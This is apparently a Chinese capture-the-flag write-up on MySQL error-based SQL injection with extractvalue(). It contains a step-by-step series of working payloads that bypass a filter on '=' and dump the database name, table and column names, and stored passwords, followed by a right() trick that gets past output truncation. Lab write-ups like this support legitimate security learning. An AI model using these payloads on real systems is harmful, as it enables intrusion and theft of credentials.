
### extractvalue() 报错注入
![](https://pic1.imgdb.cn/item/6848e66a58cb8da5c842e442.jpg)

初次尝试万能密码登录成功，说明闭合为单引号

![](https://pic1.imgdb.cn/item/6848e79b58cb8da5c842f049.jpg)

`extractvalue()` 是 **MySQL 的 XML 函数**，用于从 XML 字符串中提取数据

```sql
# xml_fragment：一个合法的 XML 结构体（字符串格式）
# xpath_expression：XPath 表达式，用于从 XML 中定位并提取节点或属性值
EXTRACTVALUE(xml_fragment, xpath_expression)
```

第一个参数肯定会报错，所以我们将 `database()` 放在中间，这样就会执行显示出数据库名

可以再加上 `concat()` 函数将显示内容包裹起来，`0x7e` 即波浪号 `~`

```sql
1'^extractvalue(1,concat(0x7e,(select(database()))))#
```

![](https://pic1.imgdb.cn/item/68495faa58cb8da5c8450122.jpg)

接下来就是爆表，这里注意 `=` 被过滤了使用 `like` 代替

```sql
1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#
```

![](https://pic1.imgdb.cn/item/6849601f58cb8da5c84503d9.jpg)

接下来爆字段

```sql
1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#
```

![](https://pic1.imgdb.cn/item/6849604658cb8da5c8450538.jpg)

查字段内容

```sql
1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#
```

![](https://pic1.imgdb.cn/item/6849608258cb8da5c845079a.jpg)

使用 `right()` 突破字符限制

```sql
1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))#
```

![](https://pic1.imgdb.cn/item/6849608e58cb8da5c8450840.jpg)
